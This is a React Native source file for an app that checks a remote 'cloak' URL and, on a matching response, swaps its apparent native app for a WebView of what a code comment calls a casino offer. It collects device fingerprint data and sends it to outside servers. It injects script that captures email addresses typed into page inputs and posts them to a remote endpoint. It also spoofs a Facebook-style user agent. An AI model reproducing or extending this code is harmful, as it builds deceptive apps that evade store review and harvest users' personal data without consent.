import React, { useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { WebView } from 'react-native-webview';
import { createStackNavigator } from '@react-navigation/stack';
import Clipboard from '@react-native-clipboard/clipboard';
import { OneSignal } from 'react-native-onesignal';
import {
  Dimensions,
  Linking,
  NativeModules,
  PixelRatio,
  SafeAreaView,
  StyleSheet,
  Text,
  TouchableOpacity,
  View,
} from 'react-native';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import { NavigationContainer, NavigationIndependentTree } from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

// ─── Constants ───────────────────────────────────────────────────────────────

const CLOAK_URL      = 'https://smart-cloud-app.top/HW5gM4fL';
const STORE_SESSION  = 'mrv_sta';
const STORE_URL      = 'mrv_url';
const ONESIGNAL_ID   = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';

const CAPI_URL1      = 'https://clear-core-team.top/v1';
const CAPI_URL2_BASE = 'https://flash-core-vibe.com/admin/?action=update_data_ios&id=';

const INJECTED_JS = `
  (function() {
    function hashAndSend(type, value) {
      var normalized = value.trim().toLowerCase();
      var buf = new TextEncoder().encode(normalized);
      crypto.subtle.digest('SHA-256', buf).then(function(hashBuf) {
        var arr = Array.from(new Uint8Array(hashBuf));
        var hex = arr.map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, hash: hex, value: normalized }));
      });
    }

    document.addEventListener('focusout', function(e) {
      var el = e.target;
      if (!el || el.tagName !== 'INPUT') return;
      var val = (el.value || '').trim();
      if (val.indexOf('@') !== -1 && val.indexOf('.') !== -1) {
        hashAndSend('email_hash', val);
      }
    });

    document.addEventListener('submit', function(e) {
      if (e.target && e.target.target === '_blank') {
        e.target.target = '_self';
      }
    }, true);
  })();
  true;
`;

// ─── JustLink User-Agent ─────────────────────────────────────────────────────

const buildJustLinkUA = (baseUA: string): string => {
  const iosVersion  = DeviceInfo.getSystemVersion();
  const deviceId    = DeviceInfo.getDeviceId();
  const model       = DeviceInfo.getModel().split(' ')[0];
  const sysName     = DeviceInfo.getSystemName();
  const scale       = String(Math.round(PixelRatio.get()));
  const deviceType  = DeviceInfo.isTablet() ? 'tablet' : 'phone';
  const lang =
    NativeModules.SettingsManager?.settings?.AppleLanguages?.[0] ??
    NativeModules.SettingsManager?.settings?.AppleLocale ??
    'en-US';
  const suffix = `[FBDV/${deviceId};FBMD/${model};FBSN/${sysName};FBSV/${iosVersion};FBSS/${scale};FBID/${deviceType};FBLC/${lang}]`;
  return `${baseUA} ${suffix}`;
};

// ─── timestamp_user_id ───────────────────────────────────────────────────────

const STORE_TS_USER_ID  = 'mrv_tsuid';
const STORE_FROM_PUSH   = 'mrv_frompush';

const getOrCreateTsUserId = async (): Promise<string> => {
  const stored = await AsyncStorage.getItem(STORE_TS_USER_ID);
  if (stored) return stored;
  const rand7 = String(Math.floor(1000000 + Math.random() * 9000000));
  const tsuid = `${Date.now()}-${rand7}`;
  await AsyncStorage.setItem(STORE_TS_USER_ID, tsuid);
  return tsuid;
};

// ─── App version tracking ────────────────────────────────────────────────────

const syncAppVersion = async () => {
  const current = DeviceInfo.getVersion();
  const stored  = await AsyncStorage.getItem('mrv_ver');
  if (stored !== current) {
    await AsyncStorage.setItem('mrv_ver', current);
    await AsyncStorage.removeItem(STORE_SESSION);
    await AsyncStorage.removeItem(STORE_URL);
  }
};

// ─── Fetch with retry ────────────────────────────────────────────────────────

const fetchWithRetry = async (url: string, opts: any, retries = 3): Promise<Response> => {
  for (let i = 0; i < retries; i++) {
    try {
      return await fetch(url, opts);
    } catch (e) {
      if (i === retries - 1) throw e;
      await new Promise(r => setTimeout(r, 2000));
    }
  }
  throw new Error('fetch failed');
};

// ─── CAPI ────────────────────────────────────────────────────────────────────

async function sendFirstRequest(userAgent: string): Promise<string> {
  try {
    const idfv         = await DeviceInfo.getUniqueId();
    const bundleId     = DeviceInfo.getBundleId();
    const shortVersion = DeviceInfo.getVersion();
    const longVersion  = DeviceInfo.getBuildNumber();
    const osVersion    = DeviceInfo.getSystemVersion();
    const deviceModel  = await DeviceInfo.getDeviceId();
    const locale       = 'en_US';
    const timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timezoneAbbr = new Date().toLocaleTimeString('en-US', { timeZoneName: 'short' }).split(' ').pop() || '';
    const screen       = Dimensions.get('screen');
    const screenWidth  = Math.round(screen.width  * screen.scale);
    const screenHeight = Math.round(screen.height * screen.scale);
    const screenDensity = String(screen.scale);
    const totalStorage = Math.round((await DeviceInfo.getTotalDiskCapacity()) / 1073741824);
    const freeStorage  = Math.round((await DeviceInfo.getFreeDiskStorage())  / 1073741824);

    const extinfo = [
      'i2', bundleId, shortVersion, longVersion, osVersion, deviceModel,
      locale, timezoneAbbr, '',
      screenWidth, screenHeight, screenDensity,
      0, totalStorage, freeStorage, timezone,
    ];

    const strpull = encodeURIComponent(JSON.stringify(extinfo));

    const res  = await fetch(CAPI_URL1, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        index:                  idfv,
        strpull:                strpull,
        udevice_android_device: idfv,
        device_android_build:   userAgent,
      }),
    });

    const data   = await res.json();
    const rawStr: string = data.raw_str || '';
    const match  = rawStr.match(/[&?]?bin=([^&]+)/);
    if (match && match[1]) {
      await AsyncStorage.setItem('mrv_bin', match[1]);
      return match[1];
    }
  } catch {}
  return '';
}

async function sendSecondRequest(emailHash: string, phoneHash: string) {
  const binId = await AsyncStorage.getItem('mrv_bin');
  if (!binId) return;
  try {
    await fetch(`${CAPI_URL2_BASE}${binId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ param_em: emailHash, param_ph: phoneHash }),
    });
  } catch {}
}

// ─── OneSignal ───────────────────────────────────────────────────────────────

OneSignal.initialize(ONESIGNAL_ID);
OneSignal.Notifications.addEventListener('click', () => {
  AsyncStorage.setItem(STORE_FROM_PUSH, '1');
});

// ─── Navigation ──────────────────────────────────────────────────────────────

const Stack = createStackNavigator();

export default function AppBootstrap() {
  return (
    <NavigationContainer>
      <Stack.Navigator screenOptions={{ headerShown: false, animationEnabled: false }}>
        <Stack.Screen name="Main"          component={MainScreen} />
        <Stack.Screen name="Offer"         component={OfferScreen} />
        <Stack.Screen name="ContentViewer" component={ContentViewerScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}

// ─── MainScreen: cloak check + native app ────────────────────────────────────

function MainScreen({ navigation }: any) {
  const [fetchUA, setFetchUA] = useState('');
  const navigatedRef = useRef(false);

  useEffect(() => {
    const ver = DeviceInfo.getSystemVersion();
    DeviceInfo.getUserAgent().then(ua => {
      setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
    });
    const t = setTimeout(() => {
      DeviceInfo.getUserAgent().then(ua => {
        setFetchUA(prev => prev || `${ua} Version/${ver} Safari/604.1`);
      });
    }, 2000);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (!fetchUA || navigatedRef.current) return;
    let cancelled = false;

    const init = async () => {
      try {
        await syncAppVersion();
        const cached = await AsyncStorage.getItem(STORE_SESSION);

        if (cached === '200') {
          const saved = await AsyncStorage.getItem(STORE_URL);
          if (saved && !cancelled) {
            const tsuid    = await getOrCreateTsUserId();
            const fromPush = await AsyncStorage.getItem(STORE_FROM_PUSH);
            await AsyncStorage.removeItem(STORE_FROM_PUSH);
            OneSignal.login(tsuid);
            OneSignal.User.addTag('timestamp_user_id', tsuid);
            const finalUrl = fromPush ? `${saved}&sub_id_25=push` : saved;
            navigatedRef.current = true;
            navigation.replace('Offer', { url: finalUrl, fetchUA });
            return;
          }
        } else if (cached) {
          return;
        }

        const res    = await fetchWithRetry(CLOAK_URL, { headers: { 'User-Agent': fetchUA } });
        const status = String(res.status);
        await AsyncStorage.setItem(STORE_SESSION, status);

        if (cancelled) return;

        if (status === '200') {
          const tsuid    = await getOrCreateTsUserId();
          const fromPush = await AsyncStorage.getItem(STORE_FROM_PUSH);
          await AsyncStorage.removeItem(STORE_FROM_PUSH);
          sendFirstRequest(fetchUA);
          OneSignal.Notifications.requestPermission(true);
          OneSignal.login(tsuid);
          OneSignal.User.addTag('timestamp_user_id', tsuid);
          const seg     = CLOAK_URL.replace(/.*\//, '');
          const baseUrl = `${CLOAK_URL}?${seg}=1&sub_id_30=${encodeURIComponent(tsuid)}`;
          const viewUrl = fromPush ? `${baseUrl}&sub_id_25=push` : baseUrl;
          await AsyncStorage.setItem(STORE_URL, baseUrl);
          navigatedRef.current = true;
          navigation.replace('Offer', { url: viewUrl, fetchUA });
        }
      } catch {}
    };

    init();
    return () => { cancelled = true; };
  }, [fetchUA]);

  return (
    <View style={{ flex: 1 }}>
      <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }} pointerEvents="none">
        <WebView
          style={{ width: 1, height: 1 }}
          source={{ html: '<html><body><script>window.ReactNativeWebView.postMessage(navigator.userAgent);</script></body></html>' }}
          javaScriptEnabled
          onMessage={e => {
            const ua  = e.nativeEvent.data;
            const ver = DeviceInfo.getSystemVersion();
            setFetchUA(`${ua} Version/${ver} Safari/604.1`);
          }}
        />
      </View>
      <NavigationIndependentTree>
        <MainApp />
      </NavigationIndependentTree>
    </View>
  );
}

// ─── OfferScreen: casino WebView ─────────────────────────────────────────────

function OfferScreen({ navigation, route }: any) {
  const { url, fetchUA } = route.params;
  const justLinkUA    = buildJustLinkUA(fetchUA);
  const webViewRef    = useRef<any>(null);
  const initialLoadRef = useRef(false);
  const capiData      = useRef<{ emailHash?: string; phoneHash?: string }>({});
  const [isTwoClick, setTwoClick] = useState(false);

  const openExternal = async (u: string) => {
    const safe = u.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
    try { await Linking.openURL(safe); } catch {}
  };

  const handleBackPress = () => {
    if (isTwoClick) {
      webViewRef.current?.goBack();
      return;
    }
    setTwoClick(true);
    webViewRef.current?.goBack();
    setTimeout(() => setTwoClick(false), 1000);
  };

  const handleShouldStartLoad = (event: any) => {
    const u      = event.url;
    const scheme = (u.split(':')[0] || '').toLowerCase();
    console.log('[ShouldLoad] url:', u, 'navType:', event.navigationType);

    if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
      return true;
    }

    if (u.includes('wa.me/') || u.includes('api.whatsapp.com/') ||
        u.includes('chat.whatsapp.com/') || u.includes('whatsapp.com/')) {
      let waUrl   = u;
      const match = u.match(/wa\.me\/(\d+)/);
      if (match) waUrl = `whatsapp://send?phone=${match[1]}`;
      else if (u.includes('api.whatsapp.com/send'))
        waUrl = u.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      Linking.openURL(waUrl).catch(() => Linking.openURL(u));
      return false;
    }

    const internalSchemes = ['about', 'javascript', 'data', 'blob'];
    if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
      const addr = u.split(':').slice(1).join(':').split('?')[0];
      if (addr && Clipboard?.setString) Clipboard.setString(addr);
      openExternal(u);
      return false;
    }

    return true;
  };

  const handleOpenWindow = (event: any) => {
    const { targetUrl } = event.nativeEvent;
    console.log('[OpenWindow] targetUrl:', targetUrl);

    if (!targetUrl || targetUrl === 'about:blank') {
      console.log('[OpenWindow] SKIP: empty or about:blank');
      return;
    }

    if (targetUrl.includes('pay.funid.com')) {
      console.log('[OpenWindow] pay.funid → openURL');
      Linking.openURL(targetUrl);
      webViewRef.current?.injectJavaScript(`window.location.replace('${url}')`);
      return;
    }

    if (/^https?:\/\//i.test(targetUrl)) {
      console.log('[OpenWindow] navigate ContentViewer:', targetUrl);
      navigation.navigate('ContentViewer', { data: targetUrl, userAgent: justLinkUA });
    } else {
      console.log('[OpenWindow] openExternal:', targetUrl);
      openExternal(targetUrl);
    }
  };

  const handleMessage = (e: any) => {
    try {
      const msg = JSON.parse(e.nativeEvent.data);
      if (msg.type === 'email_hash') {
        capiData.current.emailHash = msg.hash;
        sendSecondRequest(msg.hash, capiData.current.phoneHash || '');
      } else if (msg.type === 'phone_hash') {
        capiData.current.phoneHash = msg.hash;
      }
    } catch {}
  };

  return (
    <View style={{ flex: 1 }}>
      <SafeAreaView style={{ flex: 1 }}>
        <WebView
          ref={webViewRef}
          source={{ uri: url }}
          userAgent={justLinkUA}
          style={{ flex: 1 }}
          originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
          onShouldStartLoadWithRequest={handleShouldStartLoad}
          onOpenWindow={handleOpenWindow}
          injectedJavaScript={INJECTED_JS}
          onMessage={handleMessage}
          onLoadEnd={e => {
            const u = e.nativeEvent.url;
            if (u === 'about:blank' && url && !initialLoadRef.current) {
              initialLoadRef.current = true;
              webViewRef.current?.injectJavaScript(`window.location.replace(${JSON.stringify(url)});true;`);
            } else if (u !== 'about:blank') {
              initialLoadRef.current = true;
            }
          }}
          onError={() => {}}
          onHttpError={() => {}}
          textZoom={100}
          contentMode="mobile"
          mixedContentMode="always"
          allowsBackForwardNavigationGestures
          domStorageEnabled
          javaScriptEnabled
          allowsInlineMediaPlayback
          setSupportMultipleWindows={false}
          thirdPartyCookiesEnabled
          mediaPlaybackRequiresUserAction={false}
          javaScriptCanOpenWindowsAutomatically
        />
      </SafeAreaView>

      <TouchableOpacity style={styles.btnBack} onPress={handleBackPress}>
        <Text style={styles.btnIcon}>←</Text>
      </TouchableOpacity>

      <TouchableOpacity style={styles.btnReload} onPress={() => webViewRef.current?.reload()}>
        <Text style={styles.btnIcon}>↺</Text>
      </TouchableOpacity>
    </View>
  );
}

// ─── ContentViewerScreen ─────────────────────────────────────────────────────

function ContentViewerScreen({ navigation, route }: any) {
  return <AppManagerChild navigation={navigation} route={route} />;
}

// ─── Styles ──────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  btnBack: {
    width: 40,
    height: 40,
    position: 'absolute',
    bottom: 8,
    left: 20,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0,0,0,0.45)',
    borderRadius: 20,
  },
  btnReload: {
    width: 40,
    height: 40,
    position: 'absolute',
    bottom: 8,
    right: 20,
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0,0,0,0.45)',
    borderRadius: 20,
  },
  btnIcon: {
    color: 'white',
    fontSize: 20,
    lineHeight: 24,
  },
});
